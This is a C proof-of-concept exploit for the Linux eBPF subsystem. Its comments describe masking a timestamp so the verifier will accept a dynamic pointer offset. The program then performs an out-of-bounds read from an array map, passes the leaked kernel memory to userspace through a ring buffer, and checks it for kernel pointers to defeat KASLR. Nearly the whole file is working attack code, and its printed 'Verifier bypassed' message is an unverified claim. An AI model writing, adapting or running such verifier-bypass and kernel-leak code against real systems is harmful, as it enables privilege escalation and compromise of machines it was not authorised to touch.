#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/bpf.h>

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

// --- BPF Helper IDs ---
#ifndef BPF_FUNC_map_lookup_elem
#define BPF_FUNC_map_lookup_elem 1
#endif
#ifndef BPF_FUNC_ktime_get_ns
#define BPF_FUNC_ktime_get_ns 5
#endif
#ifndef BPF_FUNC_ringbuf_reserve
#define BPF_FUNC_ringbuf_reserve 131
#endif
#ifndef BPF_FUNC_ringbuf_submit
#define BPF_FUNC_ringbuf_submit 132
#endif
#ifndef BPF_FUNC_ringbuf_discard
#define BPF_FUNC_ringbuf_discard 133
#endif

// --- defensive definitions of the standard BPF instruction constants ---
#ifndef BPF_ALU64
#define BPF_ALU64 0x07
#endif
#ifndef BPF_JMP
#define BPF_JMP 0x05
#endif
#ifndef BPF_STX
#define BPF_STX 0x03
#endif
#ifndef BPF_LDX
#define BPF_LDX 0x01
#endif
#ifndef BPF_LD
#define BPF_LD 0x00
#endif
#ifndef BPF_MEM
#define BPF_MEM 0x60
#endif
#ifndef BPF_IMM
#define BPF_IMM 0x00
#endif
#ifndef BPF_DW
#define BPF_DW 0x18
#endif
#ifndef BPF_W
#define BPF_W 0x00
#endif
#ifndef BPF_MOV
#define BPF_MOV 0xb0
#endif
#ifndef BPF_K
#define BPF_K 0x00
#endif
#ifndef BPF_X
#define BPF_X 0x08
#endif
#ifndef BPF_CALL
#define BPF_CALL 0x80
#endif
#ifndef BPF_EXIT
#define BPF_EXIT 0x90
#endif
#ifndef BPF_JEQ
#define BPF_JEQ 0x10
#endif
#ifndef BPF_JA
#define BPF_JA 0x00
#endif
#ifndef BPF_ADD
#define BPF_ADD 0x00
#endif
#ifndef BPF_AND
#define BPF_AND 0x50
#endif

#define BPF_REG_0 0
#define BPF_REG_1 1
#define BPF_REG_2 2
#define BPF_REG_3 3
#define BPF_REG_4 4
#define BPF_REG_6 6
#define BPF_REG_7 7
#define BPF_REG_8 8
#define BPF_REG_10 10

// --- corrected safe instruction macros (guarantees the opcode is 100% correct) ---
#define BPF_MOV64_IMM(DST, IMM) ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_MOV64_REG(DST, SRC) ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})
#define BPF_LD_MAP_FD(DST, MAP_FD) ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM, .dst_reg = DST, .src_reg = 1, .off = 0, .imm = MAP_FD}), ((struct bpf_insn){.code = 0, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})
#define BPF_EMIT_CALL(FUNC) ((struct bpf_insn){.code = BPF_JMP | BPF_CALL, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = FUNC})
#define BPF_JMP_IMM(OP, DST, IMM, OFF) ((struct bpf_insn){.code = BPF_JMP | OP | BPF_K, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})
#define BPF_STX_MEM(SIZE, DST, SRC, OFF) ((struct bpf_insn){.code = BPF_STX | BPF_MEM | SIZE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) ((struct bpf_insn){.code = BPF_LDX | BPF_MEM | SIZE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
#define BPF_ALU64_IMM(OP, DST, IMM) ((struct bpf_insn){.code = BPF_ALU64 | OP | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_ALU64_REG(OP, DST, SRC) ((struct bpf_insn){.code = BPF_ALU64 | OP | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})
#define BPF_EXIT_INSN() ((struct bpf_insn){.code = BPF_JMP | BPF_EXIT, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})

int bpf_syscall(int cmd, union bpf_attr *attr)
{
    return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
}

int main()
{
    printf("[*] Compiling BPF OOB Leak payload inside Sandbox...\n");

    union bpf_attr attr = {0};
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = 4;
    attr.value_size = 8;
    attr.max_entries = 1;
    int array_fd = bpf_syscall(BPF_MAP_CREATE, &attr);
    if (array_fd < 0)
    {
        perror("[-] ARRAY map failed");
        return 1;
    }

    memset(&attr, 0, sizeof(attr));
    attr.map_type = BPF_MAP_TYPE_RINGBUF;
    attr.max_entries = 4096;
    int ring_fd = bpf_syscall(BPF_MAP_CREATE, &attr);
    if (ring_fd < 0)
    {
        perror("[-] RINGBUF map failed");
        return 1;
    }

    // 3. build the BPF program (instruction offsets precisely calibrated)
    struct bpf_insn prog[] = {
        // [00-01] prepare Ringbuf Reserve
        BPF_LD_MAP_FD(BPF_REG_1, ring_fd),
        // [02]
        BPF_MOV64_IMM(BPF_REG_2, 16),
        // [03]
        BPF_MOV64_IMM(BPF_REG_3, 0),
        // [04]
        BPF_EMIT_CALL(BPF_FUNC_ringbuf_reserve),
        // [05] if R0 == NULL, jump 25 steps to the EXIT block (Index 31)
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 25),

        // [06] back up the Ringbuf pointer to R6
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),
        // [07]
        BPF_MOV64_IMM(BPF_REG_1, 0),
        // [08] build Key=0 on the stack
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_1, -4),
        // [09-10] fetch the Array Map pointer
        BPF_LD_MAP_FD(BPF_REG_1, array_fd),
        // [11]
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        // [12]
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        // [13]
        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
        // [14] if R0 == NULL, jump 13 steps to the DISCARD block (Index 28)
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 13),

        // [15] back up the Array Value pointer to R7
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
        // [16] get a dynamic value (timestamp) as the obfuscation base
        BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
        // [17] R8 = random number
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),
        // [18] bitwise obfuscation so the verifier believes the offset is bounded to 0 ~ 0x1F8
        BPF_ALU64_IMM(BPF_AND, BPF_REG_8, 0x1F8),
        // [19] add pointer arithmetic (Array pointer + dynamic offset)
        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_8),

        // [20] prepare the read (default failure value)
        BPF_MOV64_IMM(BPF_REG_4, 0xDEADBEEF),
        // [21] ★ OOB read: read the contents pointed to by R7 into R4 ★
        BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_7, 0),

        // [22] write the actual Offset into the Ringbuf
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),
        // [23] write the leaked kernel data into the Ringbuf
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_4, 8),
        // [24]
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),
        // [25]
        BPF_MOV64_IMM(BPF_REG_2, 0),
        // [26] submit the Ringbuf for userspace to read
        BPF_EMIT_CALL(BPF_FUNC_ringbuf_submit),
        // [27] succeeded, unconditional jump 3 steps to the EXIT block (Index 31)
        BPF_JMP_IMM(BPF_JA, 0, 0, 3),

        // --- DISCARD BLOCK (Index 28-30) ---
        // when the Array lookup fails, the allocated Ringbuf must be discarded
        /* [28] */ BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),
        /* [29] */ BPF_MOV64_IMM(BPF_REG_2, 0),
        /* [30] */ BPF_EMIT_CALL(BPF_FUNC_ringbuf_discard),

        // --- EXIT BLOCK (Index 31-32) ---
        /* [31] */ BPF_MOV64_IMM(BPF_REG_0, 0),
        /* [32] */ BPF_EXIT_INSN()};

    char log_buf[32768] = {0}; // enlarged Log buffer
    memset(&attr, 0, sizeof(attr));
    attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr.insns = (uint64_t)prog;
    attr.insn_cnt = sizeof(prog) / sizeof(prog[0]);
    attr.license = (uint64_t)"GPL";
    attr.log_buf = (uint64_t)log_buf;
    attr.log_size = sizeof(log_buf);
    attr.log_level = 1;

    int prog_fd = bpf_syscall(BPF_PROG_LOAD, &attr);
    if (prog_fd < 0)
    {
        printf("[-] Verifier Rejected the Program:\n\n%s\n", log_buf);
        return 1;
    }
    printf("[+] BPF Program loaded successfully! Verifier bypassed.\n");

    // 4. mmap the Ringbuf page and read the result
    void *base = mmap(NULL, 16384, PROT_READ | PROT_WRITE, MAP_SHARED, ring_fd, 0);
    unsigned long *producer_pos = (unsigned long *)((char *)base + 4096);
    void *data_page = (char *)base + 8192;

    // 5. trigger BPF
    int socks[2];
    socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
    setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd));
    write(socks[1], "TRIGGER", 7);

    // 6. read the leaked data
    if (*producer_pos > 0)
    {
        unsigned long *data = (unsigned long *)data_page;
        printf("[+] OOB Leak Success! Offset: 0x%lx, Leaked Value: 0x%016lx\n", data[1], data[2]);
        if ((data[2] >> 40) == 0xffffff)
        {
            printf("[★] Found Kernel Pointer! KASLR Base might be deducible.\n");
        }
    }
    else
    {
        printf("[-] Program ran, but no data in ringbuf.\n");
    }

    return 0;
}

// scp ./bpf_sandbox_kaslr_leak pi@10.122.61.65:/home/pi/